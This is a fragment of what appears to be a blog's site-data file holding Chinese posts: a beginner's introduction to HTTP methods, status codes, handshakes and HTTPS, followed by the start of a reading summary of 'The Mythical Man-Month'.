Permanently</h5><p>被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个URI之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。<br>新的永久性的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。<br>如果这不是一个GET或者HEAD请求，因此浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。<br>注意：对于某些使用HTTP/1.0协议的浏览器，当它们发送的POST请求得到了一个301响应的话，接下来的重定向请求将会变成GET方式。</p><h5 id=\"302-Found\"><a href=\"#302-Found\" class=\"headerlink\" title=\"302 Found\"></a>302 Found</h5><p>要求客户端执行临时重定向（原始描述短语为“Moved Temporarily”）。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。<br>新的临时性的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。<br>如果这不是一个GET或者HEAD请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。<br>注意：虽然RFC 1945和RFC 2068规范不允许客户端在重定向时改变请求的方法，但是很多现存的浏览器将302响应视作为303响应，并且使用GET方式访问在Location中规定的URI，而无视原先请求的方法。因此状态码303和307被添加了进来，用以明确服务器期待客户端进行何种反应。</p><h5 id=\"303-See-Other\"><a href=\"#303-See-Other\" class=\"headerlink\" title=\"303 See Other\"></a>303 See Other</h5><p>对应当前请求的响应可以在另一个URI上被找到，当响应于POST（或PUT / DELETE）接收到响应时，客户端应该假定服务器已经收到数据，并且应该使用单独的GET消息发出重定向。这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。这个新的URI不是原始资源的替代引用。同时，303响应禁止被缓存。当然，第二个请求（重定向）可能被缓存。<br>新的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。<br>注意：许多HTTP/1.1版以前的浏览器不能正确理解303状态。如果需要考虑与这些浏览器之间的互动，302状态码应该可以胜任，因为大多数的浏览器处理302响应时的方式恰恰就是上述规范要求客户端处理303响应时应当做的。</p><h5 id=\"304-Not-Modified\"><a href=\"#304-Not-Modified\" class=\"headerlink\" title=\"304 Not Modified\"></a>304 Not Modified</h5><p>表示资源未被修改，因为请求头指定的版本If-Modified-Since或If-None-Match。在这种情况下，由于客户端仍然具有以前下载的副本，因此不需要重新传输资源。</p><h5 id=\"307-Temporary-Redirect\"><a href=\"#307-Temporary-Redirect\" class=\"headerlink\" title=\"307 Temporary Redirect\"></a>307 Temporary Redirect</h5><p>在这种情况下，请求应该与另一个URI重复，但后续的请求应仍使用原始的URI。 与302相反，当重新发出原始请求时，不允许更改请求方法。 例如，应该使用另一个POST请求来重复POST请求。</p><h4 id=\"4XX客户端错误\"><a href=\"#4XX客户端错误\" class=\"headerlink\" title=\"4XX客户端错误\"></a>4XX客户端错误</h4><h5 id=\"400-Bad-Request\"><a href=\"#400-Bad-Request\" class=\"headerlink\" title=\"400 Bad Request\"></a>400 Bad Request</h5><p>由于明显的客户端错误（例如，格式错误的请求语法，太大的大小，无效的请求消息或欺骗性路由请求），服务器不能或不会处理该请求</p><h5 id=\"401-Unauthorized\"><a href=\"#401-Unauthorized\" class=\"headerlink\" title=\"401 Unauthorized\"></a>401 Unauthorized</h5><p>用户没有必要的凭据。该状态码表示当前请求需要用户验证。该响应必须包含一个适用于被请求资源的WWW-Authenticate信息头用以询问用户信息。客户端可以重复提交一个包含恰当的Authorization头信息的请求。如果当前请求已经包含了Authorization证书，那么401响应代表着服务器验证已经拒绝了那些证书。如果401响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。</p><h5 id=\"403-Forbidden\"><a href=\"#403-Forbidden\" class=\"headerlink\" title=\"403 Forbidden\"></a>403 Forbidden</h5><p>服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个HEAD请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个404响应，假如它不希望让客户端获得任何信息。</p><h5 id=\"404-Not-Found\"><a href=\"#404-Not-Found\" class=\"headerlink\" title=\"404 Not Found\"></a>404 Not Found</h5><p>请求失败，请求所希望得到的资源未被在服务器上发现，但允许用户的后续请求。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。</p><h4 id=\"5XX服务器错误\"><a href=\"#5XX服务器错误\" class=\"headerlink\" title=\"5XX服务器错误\"></a>5XX服务器错误</h4><h5 id=\"500-Internal-Server-Error\"><a href=\"#500-Internal-Server-Error\" class=\"headerlink\" title=\"500 Internal Server Error\"></a>500 Internal Server Error</h5><p>通用错误消息，服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。没有给出具体错误信息。</p><h5 id=\"503-Service-Unavailable\"><a href=\"#503-Service-Unavailable\" class=\"headerlink\" title=\"503 Service Unavailable\"></a>503 Service Unavailable</h5><p>由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是暂时的，并且将在一段时间以后恢复。如果能够预计延迟时间，那么响应中可以包含一个Retry-After头用以标明这个延迟时间。如果没有给出这个Retry-After信息，那么客户端应当以处理500响应的方式处理它。</p><h4 id=\"HTTP的应用\"><a href=\"#HTTP的应用\" class=\"headerlink\" title=\"HTTP的应用\"></a>HTTP的应用</h4><h5 id=\"三次握手，四次挥手\"><a href=\"#三次握手，四次挥手\" class=\"headerlink\" title=\"三次握手，四次挥手\"></a>三次握手，四次挥手</h5><p>哪三次握手？以一个小段子来解释。<br>第一次握手：A确定B是不是知道A喜欢他;问：‘你是不是喜欢我啊？’<br>第二次握手：B告诉A他很喜欢她，并且反问;答：‘我喜欢你啊，你喜欢我吗？’<br>第三次握手：A告诉B;说：‘我喜欢你啊，那我们在一起吧。。。’<br>于是他们就在一起了。<br>这就是经典的三次握手<br>那又是哪四次挥手呢？<br>第一次说：A告诉B她不喜欢他了;说：‘我已经不喜欢你了，我们分手吧。’<br>第二次说：B告诉A说也不喜欢她了;说：’我知道了，我也不喜欢你了，我们分手吧。‘<br>第三次说：A告诉B说他已经知道了：’我知道了，那我们分手吧。‘<br>第四次说：B告诉A说他已经知道了A的心意：’我知道了，那我们就分手吧。‘<br>于是他们因此分手。</p><p><strong>为什么是三次握手呢？</strong><br>在知乎上看到一个人这样答道：<br>这个问题的本质是, 信道不可靠, 但是通信双发需要就某个问题达成一致. 而要解决这个问题, 无论你在消息中包含什么信息, 三次通信是理论上的最小值. 所以三次握手不是TCP本身的要求, 而是为了满足”在不可靠信道上可靠地传输信息”这一需求所导致的. 请注意这里的本质需求,信道不可靠, 数据传输要可靠. 三次达到了, 那后面你想接着握手也好, 发数据也好, 跟进行可靠信息传输的需求就没关系了. 因此,如果信道是可靠的, 即无论什么时候发出消息, 对方一定能收到, 或者你不关心是否要保证对方收到你的消息, 那就能像UDP那样直接发送消息就可以了.<br>为了满足数据的可靠性。因而才设置三次握手。我想，大概四次挥手也是这个原理吧</p><h4 id=\"http有不满足现代web发展的需求？\"><a href=\"#http有不满足现代web发展的需求？\" class=\"headerlink\" title=\"http有不满足现代web发展的需求？\"></a>http有不满足现代web发展的需求？</h4><p>http是上个世纪的产物，到达21世纪之后，http的功能已经捉襟见肘。因此，有了扩展的http，https。</p><h5 id=\"什么是HTTPS\"><a href=\"#什么是HTTPS\" class=\"headerlink\" title=\"什么是HTTPS\"></a>什么是HTTPS</h5><p>https并不是新型产物，而是http Secure，是更安全版本。在其基础上加了一层ssl层。用于安全的HTTP数据传输。https:URL表明它使用了HTTP，但HTTPS存在不同于HTTP的默认端口及一个加密/身份验证层（在HTTP与TCP之间）。这个系统的最初研发由网景公司(Netscape)进行，并内置于其浏览器Netscape Navigator中，提供了身份验证与加密通讯方法。现在它被广泛用于万维网上安全敏感的通讯，例如交易支付方面。</p><h5 id=\"为什么要HTTPS\"><a href=\"#为什么要HTTPS\" class=\"headerlink\" title=\"为什么要HTTPS\"></a>为什么要HTTPS</h5><p>由于普通的http协议会经过多层代理服务器，因此可能在通讯过程中的数据的泄密和被篡改。也可能遭到非法入侵。因此，为了更好的用户保密，以及确定用户身份。有了ssl层。<br>ssl释义：<br><code>SSL(Secure Sockets Layer 安全套接层),及其继任者传输层安全(Transport Layer Security，TLS)是为网络通信提供安全及数据完整性的一种安全协议。TLS与SSL在传输层对网络连接进行加密。</code><br>因此，ssl保证了http的安全性。也由于其多层的访问确认关系，要比正常的http慢2-100倍</p><h5 id=\"总结：\"><a href=\"#总结：\" class=\"headerlink\" title=\"总结：\"></a>总结：</h5><p>初识http让我从前端思维到后端思维的一个过渡。逐渐解密在数据传输过程中的小黑匣。http状态码以及其工作原理也十分重要的体现在我日常工作中。后端的思维过渡以及前端的新层面让我了然于胸。初识http，重新认识了互联网。</p>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"初识http\"><a href=\"#初识http\" class=\"headerlink\" title=\"初识http\"></a>初识http</h4><p>在刚刚开始学习前端ajax时，经常听说http协议，“不就是三次握手，四次挥手吗？”，一番言语过后。似懂非懂。近期由于开始学习nodejs，借此机会开始学习了一波http</p><h4 id=\"什么是http\"><a href=\"#什么是http\" class=\"headerlink\" title=\"什么是http?\"></a>什么是http?</h4><p>从其英文全意来看，是HyperText Transfer Protocol，中文解释是超文本传输协议。那什么又是超文本？。在wiki上解释是：</p><p><code>超文本（英语：Hypertext）是一种在电脑显示器或其他电子设备，用以显示文本及与文本相关的内容，其中的文字包含有可以链接到其他字段或者文档的超链接，允许从当前阅读位置直接切换到超链接所指向的文字。万维网的架构便是以超文本的底层概念定义为基础。</code></p><p>因此，从概念上来看，http最初的目的就是为了提供一种发布和接收HTML页面的方法。</p><h4 id=\"http包含了那些方法？\"><a href=\"#http包含了那些方法？\" class=\"headerlink\" title=\"http包含了那些方法？\"></a>http包含了那些方法？</h4><p>HTTP/1.1协议中共定义了八种方法（也叫“动作”）来以不同方式操作指定的资源：</p><h5 id=\"GET\"><a href=\"#GET\" class=\"headerlink\" title=\"GET\"></a>GET</h5><p>向指定的资源发出“显示”请求。使用GET方法应该只用在读取数据，而不应当被用于产生“副作用”的操作中，例如在Web Application中。其中一个原因是GET可能会被网络蜘蛛等随意访问。参见安全方法</p><h5 id=\"HEAD\"><a href=\"#HEAD\" class=\"headerlink\" title=\"HEAD\"></a>HEAD</h5><p>与GET方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部分。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）。</p><h5 id=\"POST\"><a href=\"#POST\" class=\"headerlink\" title=\"POST\"></a>POST</h5><p>向指定资源提交数据，请求服务器进行处理（例如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。</p><h5 id=\"PUT\"><a href=\"#PUT\" class=\"headerlink\" title=\"PUT\"></a>PUT</h5><p>向指定资源位置上传其最新内容。</p><h5 id=\"DELETE\"><a href=\"#DELETE\" class=\"headerlink\" title=\"DELETE\"></a>DELETE</h5><p>请求服务器删除Request-URI所标识的资源。</p><h5 id=\"TRACE\"><a href=\"#TRACE\" class=\"headerlink\" title=\"TRACE\"></a>TRACE</h5><p>回显服务器收到的请求，主要用于测试或诊断。</p><h5 id=\"OPTIONS\"><a href=\"#OPTIONS\" class=\"headerlink\" title=\"OPTIONS\"></a>OPTIONS</h5><p>这个方法可使服务器传回该资源所支持的所有HTTP请求方法。用’*’来代替资源名称，向Web服务器发送OPTIONS请求，可以测试服务器功能是否正常运作。</p><h5 id=\"CONNECT\"><a href=\"#CONNECT\" class=\"headerlink\" title=\"CONNECT\"></a>CONNECT</h5><p>HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接（经由非加密的HTTP代理服务器）。<br>方法名称是区分大小写的。当某个请求所针对的资源不支持对应的请求方法的时候，服务器应当返回状态码405（Method Not Allowed），当服务器不认识或者不支持对应的请求方法的时候，应当返回状态码501（Not Implemented）。<br>HTTP服务器至少应该实现GET和HEAD方法，其他方法都是可选的。当然，所有的方法支持的实现都应当匹配下述的方法各自的语义定义。此外，除了上述方法，特定的HTTP服务器还能够扩展自定义的方法。例如：</p><h5 id=\"PATCH（由-RFC-5789-指定的方法）\"><a href=\"#PATCH（由-RFC-5789-指定的方法）\" class=\"headerlink\" title=\"PATCH（由 RFC 5789 指定的方法）\"></a>PATCH（由 RFC 5789 指定的方法）</h5><p>用于将局部修改应用到资源。</p><p>一般来说，我们常用的有GET,POST,DELETE,PUT四个方法。大多数情况用于获取，增改，删除以及传输文件。</p><h4 id=\"http包含那些内容？\"><a href=\"#http包含那些内容？\" class=\"headerlink\" title=\"http包含那些内容？\"></a>http包含那些内容？</h4><p>大体上，包含报文首部，报文主体。</p><h5 id=\"报文首部\"><a href=\"#报文首部\" class=\"headerlink\" title=\"报文首部\"></a>报文首部</h5><p>报文首部由于请求以及响应的报文首部。</p><h5 id=\"请求报文首部。\"><a href=\"#请求报文首部。\" class=\"headerlink\" title=\"请求报文首部。\"></a>请求报文首部。</h5><p>请求行：包含用于请求的方法，请求URI以及HTTP版本<br>首部字段:包含表示请求和响应的各种条件和属性的各类首部。一般有四种首部，分别是：请求首部、响应首部、通用首部以及实用首部<br>其他：可能包含HTTP里为定义RFC的首部(Cookie等)</p><h5 id=\"响应报文首部\"><a href=\"#响应报文首部\" class=\"headerlink\" title=\"响应报文首部\"></a>响应报文首部</h5><p>状态行:包含表明结果的状态码，原因短语和HTTP版本<br>首部字段:包含表示请求和响应的各种条件和属性的各类首部。一般有四种首部，分别是：请求首部、响应首部、通用首部以及实用首部<br>其他：可能包含HTTP里为定义RFC的首部(Cookie等)</p><h5 id=\"报文主体\"><a href=\"#报文主体\" class=\"headerlink\" title=\"报文主体\"></a>报文主体</h5><p>报文主体和报文首部是分开的。由换行分开报文首部以及报文主体。</p><h5 id=\"返回结果的常用HTTP状态码\"><a href=\"#返回结果的常用HTTP状态码\" class=\"headerlink\" title=\"返回结果的常用HTTP状态码\"></a>返回结果的常用HTTP状态码</h5><table><thead><tr><th>状态码</th><th>类别</th><th>原因短语</th></tr></thead><tbody><tr><td>1xx</td><td>Informational(信息性状态码)</td><td>接受的请求正在处理</td></tr><tr><td>2xx</td><td>Success(成功状态码)</td><td>请求正常处理完毕</td></tr><tr><td>3xx</td><td>Redirection(重定向状态码)</td><td>需要进行附加操作以完成请求</td></tr><tr><td>4xx</td><td>Client Error(客户端错误状态码)</td><td>服务器无法处理请求</td></tr><tr><td>5xx</td><td>Server Error(服务器端错误状态码)</td><td>服务器处理请求出错</td></tr></tbody></table><h4 id=\"1XX-消息\"><a href=\"#1XX-消息\" class=\"headerlink\" title=\"1XX 消息\"></a>1XX 消息</h4><p>这一类型的状态码，代表请求已被接受，需要继续处理。这类响应是临时响应，只包含状态行和某些可选的响应头信息，并以空行结束。由于HTTP/1.0协议中没有定义任何1xx状态码，所以除非在某些试验条件下，服务器禁止向此类客户端发送1xx响应。</p><h4 id=\"2XX-成功\"><a href=\"#2XX-成功\" class=\"headerlink\" title=\"2XX 成功\"></a>2XX 成功</h4><h5 id=\"200-Ok\"><a href=\"#200-Ok\" class=\"headerlink\" title=\"200 Ok\"></a>200 Ok</h5><p>请求已成功，请求所希望的响应头或数据体将随此响应返回。实际的响应将取决于所使用的请求方法。在GET请求中，响应将包含与请求的资源相对应的实体。在POST请求中，响应将包含描述或操作结果的实体。</p><h5 id=\"204-No-Content\"><a href=\"#204-No-Content\" class=\"headerlink\" title=\"204 No Content\"></a>204 No Content</h5><p>服务器成功处理了请求，没有返回任何内容。</p><h5 id=\"206-Partial-Content\"><a href=\"#206-Partial-Content\" class=\"headerlink\" title=\"206 Partial Content\"></a>206 Partial Content</h5><p>服务器已经成功处理了部分GET请求。类似于FlashGet或者迅雷这类的HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。</p><h4 id=\"3XX-重定向\"><a href=\"#3XX-重定向\" class=\"headerlink\" title=\"3XX 重定向\"></a>3XX 重定向</h4><h5 id=\"301-Moved-Permanently\"><a href=\"#301-Moved-Permanently\" class=\"headerlink\" title=\"301 Moved Permanently\"></a>301 Moved Permanently</h5><p>被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个URI之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。<br>新的永久性的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。<br>如果这不是一个GET或者HEAD请求，因此浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。<br>注意：对于某些使用HTTP/1.0协议的浏览器，当它们发送的POST请求得到了一个301响应的话，接下来的重定向请求将会变成GET方式。</p><h5 id=\"302-Found\"><a href=\"#302-Found\" class=\"headerlink\" title=\"302 Found\"></a>302 Found</h5><p>要求客户端执行临时重定向（原始描述短语为“Moved Temporarily”）。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。<br>新的临时性的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。<br>如果这不是一个GET或者HEAD请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。<br>注意：虽然RFC 1945和RFC 2068规范不允许客户端在重定向时改变请求的方法，但是很多现存的浏览器将302响应视作为303响应，并且使用GET方式访问在Location中规定的URI，而无视原先请求的方法。因此状态码303和307被添加了进来，用以明确服务器期待客户端进行何种反应。</p><h5 id=\"303-See-Other\"><a href=\"#303-See-Other\" class=\"headerlink\" title=\"303 See Other\"></a>303 See Other</h5><p>对应当前请求的响应可以在另一个URI上被找到，当响应于POST（或PUT / DELETE）接收到响应时，客户端应该假定服务器已经收到数据，并且应该使用单独的GET消息发出重定向。这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。这个新的URI不是原始资源的替代引用。同时，303响应禁止被缓存。当然，第二个请求（重定向）可能被缓存。<br>新的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。<br>注意：许多HTTP/1.1版以前的浏览器不能正确理解303状态。如果需要考虑与这些浏览器之间的互动，302状态码应该可以胜任，因为大多数的浏览器处理302响应时的方式恰恰就是上述规范要求客户端处理303响应时应当做的。</p><h5 id=\"304-Not-Modified\"><a href=\"#304-Not-Modified\" class=\"headerlink\" title=\"304 Not Modified\"></a>304 Not Modified</h5><p>表示资源未被修改，因为请求头指定的版本If-Modified-Since或If-None-Match。在这种情况下，由于客户端仍然具有以前下载的副本，因此不需要重新传输资源。</p><h5 id=\"307-Temporary-Redirect\"><a href=\"#307-Temporary-Redirect\" class=\"headerlink\" title=\"307 Temporary Redirect\"></a>307 Temporary Redirect</h5><p>在这种情况下，请求应该与另一个URI重复，但后续的请求应仍使用原始的URI。 与302相反，当重新发出原始请求时，不允许更改请求方法。 例如，应该使用另一个POST请求来重复POST请求。</p><h4 id=\"4XX客户端错误\"><a href=\"#4XX客户端错误\" class=\"headerlink\" title=\"4XX客户端错误\"></a>4XX客户端错误</h4><h5 id=\"400-Bad-Request\"><a href=\"#400-Bad-Request\" class=\"headerlink\" title=\"400 Bad Request\"></a>400 Bad Request</h5><p>由于明显的客户端错误（例如，格式错误的请求语法，太大的大小，无效的请求消息或欺骗性路由请求），服务器不能或不会处理该请求</p><h5 id=\"401-Unauthorized\"><a href=\"#401-Unauthorized\" class=\"headerlink\" title=\"401 Unauthorized\"></a>401 Unauthorized</h5><p>用户没有必要的凭据。该状态码表示当前请求需要用户验证。该响应必须包含一个适用于被请求资源的WWW-Authenticate信息头用以询问用户信息。客户端可以重复提交一个包含恰当的Authorization头信息的请求。如果当前请求已经包含了Authorization证书，那么401响应代表着服务器验证已经拒绝了那些证书。如果401响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。</p><h5 id=\"403-Forbidden\"><a href=\"#403-Forbidden\" class=\"headerlink\" title=\"403 Forbidden\"></a>403 Forbidden</h5><p>服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个HEAD请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个404响应，假如它不希望让客户端获得任何信息。</p><h5 id=\"404-Not-Found\"><a href=\"#404-Not-Found\" class=\"headerlink\" title=\"404 Not Found\"></a>404 Not Found</h5><p>请求失败，请求所希望得到的资源未被在服务器上发现，但允许用户的后续请求。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。</p><h4 id=\"5XX服务器错误\"><a href=\"#5XX服务器错误\" class=\"headerlink\" title=\"5XX服务器错误\"></a>5XX服务器错误</h4><h5 id=\"500-Internal-Server-Error\"><a href=\"#500-Internal-Server-Error\" class=\"headerlink\" title=\"500 Internal Server Error\"></a>500 Internal Server Error</h5><p>通用错误消息，服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。没有给出具体错误信息。</p><h5 id=\"503-Service-Unavailable\"><a href=\"#503-Service-Unavailable\" class=\"headerlink\" title=\"503 Service Unavailable\"></a>503 Service Unavailable</h5><p>由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是暂时的，并且将在一段时间以后恢复。如果能够预计延迟时间，那么响应中可以包含一个Retry-After头用以标明这个延迟时间。如果没有给出这个Retry-After信息，那么客户端应当以处理500响应的方式处理它。</p><h4 id=\"HTTP的应用\"><a href=\"#HTTP的应用\" class=\"headerlink\" title=\"HTTP的应用\"></a>HTTP的应用</h4><h5 id=\"三次握手，四次挥手\"><a href=\"#三次握手，四次挥手\" class=\"headerlink\" title=\"三次握手，四次挥手\"></a>三次握手，四次挥手</h5><p>哪三次握手？以一个小段子来解释。<br>第一次握手：A确定B是不是知道A喜欢他;问：‘你是不是喜欢我啊？’<br>第二次握手：B告诉A他很喜欢她，并且反问;答：‘我喜欢你啊，你喜欢我吗？’<br>第三次握手：A告诉B;说：‘我喜欢你啊，那我们在一起吧。。。’<br>于是他们就在一起了。<br>这就是经典的三次握手<br>那又是哪四次挥手呢？<br>第一次说：A告诉B她不喜欢他了;说：‘我已经不喜欢你了，我们分手吧。’<br>第二次说：B告诉A说也不喜欢她了;说：’我知道了，我也不喜欢你了，我们分手吧。‘<br>第三次说：A告诉B说他已经知道了：’我知道了，那我们分手吧。‘<br>第四次说：B告诉A说他已经知道了A的心意：’我知道了，那我们就分手吧。‘<br>于是他们因此分手。</p><p><strong>为什么是三次握手呢？</strong><br>在知乎上看到一个人这样答道：<br>这个问题的本质是, 信道不可靠, 但是通信双发需要就某个问题达成一致. 而要解决这个问题, 无论你在消息中包含什么信息, 三次通信是理论上的最小值. 所以三次握手不是TCP本身的要求, 而是为了满足”在不可靠信道上可靠地传输信息”这一需求所导致的. 请注意这里的本质需求,信道不可靠, 数据传输要可靠. 三次达到了, 那后面你想接着握手也好, 发数据也好, 跟进行可靠信息传输的需求就没关系了. 因此,如果信道是可靠的, 即无论什么时候发出消息, 对方一定能收到, 或者你不关心是否要保证对方收到你的消息, 那就能像UDP那样直接发送消息就可以了.<br>为了满足数据的可靠性。因而才设置三次握手。我想，大概四次挥手也是这个原理吧</p><h4 id=\"http有不满足现代web发展的需求？\"><a href=\"#http有不满足现代web发展的需求？\" class=\"headerlink\" title=\"http有不满足现代web发展的需求？\"></a>http有不满足现代web发展的需求？</h4><p>http是上个世纪的产物，到达21世纪之后，http的功能已经捉襟见肘。因此，有了扩展的http，https。</p><h5 id=\"什么是HTTPS\"><a href=\"#什么是HTTPS\" class=\"headerlink\" title=\"什么是HTTPS\"></a>什么是HTTPS</h5><p>https并不是新型产物，而是http Secure，是更安全版本。在其基础上加了一层ssl层。用于安全的HTTP数据传输。https:URL表明它使用了HTTP，但HTTPS存在不同于HTTP的默认端口及一个加密/身份验证层（在HTTP与TCP之间）。这个系统的最初研发由网景公司(Netscape)进行，并内置于其浏览器Netscape Navigator中，提供了身份验证与加密通讯方法。现在它被广泛用于万维网上安全敏感的通讯，例如交易支付方面。</p><h5 id=\"为什么要HTTPS\"><a href=\"#为什么要HTTPS\" class=\"headerlink\" title=\"为什么要HTTPS\"></a>为什么要HTTPS</h5><p>由于普通的http协议会经过多层代理服务器，因此可能在通讯过程中的数据的泄密和被篡改。也可能遭到非法入侵。因此，为了更好的用户保密，以及确定用户身份。有了ssl层。<br>ssl释义：<br><code>SSL(Secure Sockets Layer 安全套接层),及其继任者传输层安全(Transport Layer Security，TLS)是为网络通信提供安全及数据完整性的一种安全协议。TLS与SSL在传输层对网络连接进行加密。</code><br>因此，ssl保证了http的安全性。也由于其多层的访问确认关系，要比正常的http慢2-100倍</p><h5 id=\"总结：\"><a href=\"#总结：\" class=\"headerlink\" title=\"总结：\"></a>总结：</h5><p>初识http让我从前端思维到后端思维的一个过渡。逐渐解密在数据传输过程中的小黑匣。http状态码以及其工作原理也十分重要的体现在我日常工作中。后端的思维过渡以及前端的新层面让我了然于胸。初识http，重新认识了互联网。</p>"},{"title":"《人月神话》整理","date":"2018-09-24T08:12:37.000Z","dir":"随笔","keywords":"人月神话","_content":"\n### 写在前面\n\n实习后，发现自己一些薄弱的点，需要好好加固一些。好在现在又学校可回，索性逃回学校重新修炼，学一些想学的，加固自己薄弱的，至少不要在职场坑了队友。\n\n《人月神话》一书，其主要介绍人/月等方面的项目管理，从项目经理角度对产品的一些想法及经验，帮助对产品的管理有了较深刻的理解。43年前出版至今依然畅销，不仅感叹作者的独特眼光、软件工程发展的缓慢。也使得我对这一学科有了更深的理解。\n\n### 编程的乐趣\n\n* 创建事物的快乐\n* 开发对其他人有用的乐趣\n* 将类似可以组装的零部件组装，这个过程本身具有魅力\n* 面对重复任务，不断学习的乐趣\n* 软件的存在形式不同于其他实际物体，工作在轻易驾驭的介质上的乐趣\n\n### 编程的烦恼\n\n* 将做事的方式调整到追求完美是_最困难_的部分\n* 有其他人来设定目标，必须依靠自己无法控制的程序来完成事情\n* 真正的权威来自于每次任务的完成\n* 伴随着枯燥艰苦的劳动\n* 越接近目标收敛越慢\n* 只有实际需要才会想到最新的设想\n\n### 人月神话\n\n* 缺乏合理的时间进度是造成项目滞后最主要的原因——比其他原因都大\n* 某些任务在不损害结果的情况下加快速度\n* 所有编程人员都是乐观主义者——“一切都将良好运行”\n* *构思本身就有缺陷，因此总会有bug*\n* 人员数量和时间是不可替换的——1个孕妇10月怀胎生子，10个孕妇不可能1个月生子\n* 分解任务会话费额外的时间——培训和相互沟通\n* 进度安排——1/3计划， 1/6编程， 1/4构建测试， 1/4系统测试\n* Brooks法则：为进度落后的项目增加人手，只会似的进度更加落后 —— 重新分配任务的打断；培训新人；额外的沟通\n\n### 团队的组建\n\n![team](mythical-team.jpeg)\n\n* 小型精干的团队是最好的\n\n* 一位首席程序员、类似于外科手术队伍的团队架构提供了一种方法—既能获得由少数头脑产生的产品完整性，又能得到多位协助人员的总体生产率，还彻底地减少了沟通的工作量。\n\n* ####  结构师的使命\n\n  ​\t结构师只能提出建议，牢记开发人员实现创造性的使命\n\n  ​\t时刻准备为制定说明建议一种实现方法，准备接受任何可行方法\n\n  ​\t对建议保持平静及低调\n\n  ​\t准备对建议改进及坚持放弃\n\n  ​\t听取开发人员在系统结构上的改进\n\n### 系统的设计\n\n* 概念的完整性是重中之重\n\n* \"功能与理解上的复杂程度比值才是系统设计最终目标\"\n\n* 将系统结构方面的工作与具体实现分离是获得概念完整性的最好方法\n\n* 外部的体系结构规定实习上是增强小组的创造性\n\n* 尽早交流和持续沟通能够使得结构师有较好的成本意识，是开发人员对设计有信心\n\n* 第二个系统通常是人们所设计的最危险的系统，通常是过分的进行设计\n\n* 为了概念完整性，设计必须又一个人或者具有共识的小型团队完成，设计结果必须由一个或者两个人来完成，以保证结果一致\n\n* 必须明确定义系统结构中与先前定义不同的地方，重新定义详细程度应该与之前保持一致\n\n* 出于精确性，需要形式化的定义，也需要一些记叙性的定义来加深理解\n\n* 起初至少有两种以上的实现，定义会更加整洁和规范\n\n* 结构师对实现人员的询问作出电话的解释和问答是非常重要的，必须进行日志整理和发布\n\n### 项目成功的要点\n\n#### 交流\n\n* 因为团队之间不知道在做什么，从而出现进度灾难、功能不合理和系统缺陷。由于存在对他人进度的各种假设，团队之间成员开始理解出现偏差\n* 团队应该以尽可能多的方式进行相互之间的交流，非正式的进行简要技术趁熟的常规会议项目，共享的正式项目工作手册【以及电子邮件】\n\n#### 项目工作手册\n\n​\t\t——是对项目必须产生一系列文档进行的一种组织结构\n\n* 项目所有文档都是工作手册的一部分\n* 需要尽早仔细的设计工作手册结构\n* 